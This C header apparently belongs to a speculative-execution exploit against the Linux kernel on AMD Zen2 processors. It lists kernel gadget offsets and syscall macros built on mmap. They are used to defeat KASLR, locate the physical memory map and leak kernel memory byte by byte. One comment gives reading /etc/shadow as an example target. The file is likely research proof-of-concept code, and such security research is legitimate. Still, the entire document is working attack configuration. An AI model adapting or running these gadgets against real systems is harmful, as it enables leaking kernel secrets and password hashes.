// kernel stack on zen2
// 0xffffbe5280afbf38
// actual ret target
// 0xffffffffacf72f89

#define OFFS 0x000 // dont know why.
#define LEAK_START 0x13a7269
#define FIRST_BYTE '3'
/*
 * We use these to create a basic block that matches __x64_sys_mmap in the
 * kernel. On Zen2 we only need the previous branch target, which is the jump
 * into the error path.
 */
#define MMAP_LAST_TGT     0x038875
#define MMAP_RET_OFFSET   0x03887c // 0xffffffff8103887c __x64_sys_mmap
#define MMAP_BB_SZ        (MMAP_RET_OFFSET - MMAP_LAST_TGT)
/**
 * Gadget used for finding the kernel image offset. Ironically we use a gadget
 * in kaslr to break kaslr.
 */
#define KASLR_OFFSET      0xb7c850 // 0xffffffff81b7c850 init_trampoline_kaslr
#define CALL_KASLR_GADGET(probe_off) syscall(\
    SYS_MMAP,\
    0xaaaaaaaaaaaaaaaaUL, /*rdi*/ \
    0xbbbbbbbbbbbbbbbbUL, /*rsi*/ \
    probe_off,            /*rdx*/ \
    0xccccccccccccccccUL, /*rcx*/ \
    0x8888888888888888UL, /*r08*/ \
    0x9999999999999999UL  /*r09*/ )
#define PA_OFFSET         0xb7c850
#define CALL_PA_GADGET CALL_KASLR_GADGET
#define PHYSMAP_OFFSET    0xb7c857 // 0xffffffff81b7c857 init_trampoline_kaslr
#define CALL_PHYSMAP_GADGET CALL_KASLR_GADGET
/**
 * ascii leaking gadget (max byte = 0x7f). It requires is to know the byte
 * before the targeted byte. Often this is just \00. If we want to leak
 * /etc/shadow like vusec/Blindside, the first byte could for example be 'r' (as
 * in 'root:$...').
 */
#define LEAK_ASCII_OFFSET 0x072376 // 0xffffffff81072376 module_finalize
#define LEAK_ASCII_STRIDE (1UL<<14)
#define CALL_LEAK_ASCII_GADGET(secret_ptr, rb, lower) syscall(\
    SYS_MMAP,\
    secret_ptr - 0x3e,      /*rdi*/ \
    rb - (lower<<6) - 0x18, /*rsi*/ \
    0xddddddddddddddddUL,   /*rdx*/ \
    0xccccccccccccccccUL,   /*rcx*/ \
    0x8888888888888888UL,   /*r08*/ \
    0x9999999999999999UL    /*r09*/ )
/**
 * This gadget can leak full bytes, it has a bogus load inbetween the two
 * crucial memory loads but it should work nonetheless.
 */
#define LEAK_OFFSET       0x81585c // 0xffffffff8181585c tun_net_xmit
#define LEAK_STRIDE (1UL<<11)
#define CALL_LEAK_GADGET(secret_ptr, rb, lower) syscall(\
    SYS_MMAP,\
    (secret_ptr) - 0x7c,       /*rdi*/ \
    (rb) - (lower*8) - 0x900,    /*rsi*/ \
    0xbbbbbbbbbbbbbbbbUL, /*rdx*/ \
    0xccccccccccccccccUL,    /*rcx*/ \
    0xbbbbbbbbbbbbbbbbUL,    /*r08*/ \
    0xddddddddddddddddUL     /*r09*/ )
